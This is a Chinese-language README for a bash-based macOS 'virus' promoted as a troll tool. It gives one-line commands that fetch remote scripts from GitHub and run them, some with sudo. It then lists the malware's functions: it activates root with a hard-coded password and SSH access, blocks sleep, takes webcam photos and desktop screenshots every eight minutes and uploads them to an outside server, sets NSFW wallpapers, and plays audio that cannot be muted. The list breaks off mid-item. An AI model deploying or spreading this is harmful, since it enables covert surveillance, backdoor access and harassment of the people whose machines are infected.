# 史上第一款，MacOS M系列病毒，100%纯bash（需要手动给予权限/nclick exploit）

首次设置
---
`sudo curl -fsSL https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/humaninter.sh | bash`

一键启动
---
`wget https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/init-main.sh && sh init-main.sh`

(一键启动之后建议先CTRL+C然后把~/programfiles/time.txt文件vim一下往后调3个小时，让他先强制运行一遍，确认上传+权限Terminal已经给好。然后重启电脑，确认DL.app也拥有相应权限。之后建议把Time再改回来然后直接重启。）

一键启动如果出现无法启动，没有下载完全等bug请用一下指令修复

`sudo rm -rf ~/programfiles && wget https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/init-main.sh && sh init-main.sh`

病毒功能介绍：
---
1.把root用户变成活跃用户，激活root的ssh，并将root密码更改为Aa112211!

2.完全禁用MacOS睡眠功能，保证系用永远运行，关上机盖不会影响脚本运行，更不会影响ssh的通行。

3.每8分钟通过摄像头拍一张图片，截一张桌面的图片并上传至drive.genshinimpact.ca

4.NSFW抽卡式随机壁纸，每隔随机一段时间，会自动获取一张壁纸，保底为10（第十张图片一定是NSFW，否则SFW）通过两个不同的API，达到终极社死。

5.随机音频，每隔随机一段时间，会自动从内置的音效文件夹里播放一个音效，保底为10（第十个音频一定是长音频，否则短音效），播放过程中，声音为100%，而且无法静音，无法暂停，系统无法显示播放数据。

6.